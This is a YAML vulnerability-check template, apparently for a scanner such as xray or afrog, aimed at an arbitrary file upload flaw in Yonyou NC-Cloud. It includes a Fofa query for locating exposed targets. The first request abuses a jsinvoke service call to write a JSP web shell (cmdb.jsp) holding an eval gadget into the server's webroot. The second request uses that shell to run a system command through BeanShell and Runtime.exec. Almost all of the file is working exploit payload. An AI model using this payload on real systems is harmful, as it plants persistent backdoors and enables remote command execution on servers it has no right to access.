id: yonyou-nc-cloud-fileupload

info:
  name: 用友-NC-Cloud-任意文件上传漏洞
  author: CMDB
  severity: critical
  description: |
    1.不能执行id测试，windows执行失败直接页面返回500
    2.命令存在空格无法执行
    3.Fofa: app="用友-NC-Cloud"

rules:
  r0:
    request:
      method: POST
      path: /uapjs/jsinvoke/?action=invoke
      headers:
        Content-Type: application/json
      body: |
        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/cmdb.jsp"]
    expression: response.status == 200
  r1:
    # before_sleep: 6
    request:
      method: POST
      path: /cmdb.jsp?error=bsh.Interpreter
      body: |
        cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())
    expression: response.status == 200 
expression: r0() && r1()
